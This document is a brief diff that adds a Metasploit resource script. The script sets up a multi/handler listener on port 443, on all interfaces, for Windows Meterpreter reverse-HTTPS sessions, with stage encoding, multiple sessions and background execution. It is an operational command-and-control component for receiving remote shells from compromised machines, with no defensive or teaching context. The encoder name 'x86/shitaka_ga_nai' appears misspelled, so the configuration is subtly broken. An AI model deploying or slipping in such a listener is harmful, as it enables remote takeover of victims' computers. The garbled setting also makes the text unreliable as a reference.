@@ -1,0 +1,9 @@
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 443
+set ExitOnSession false
+set EnableStageEncoding true
+set StageEncoder x86/shitaka_ga_nai
+set VERBOSE true
+exploit -j -z
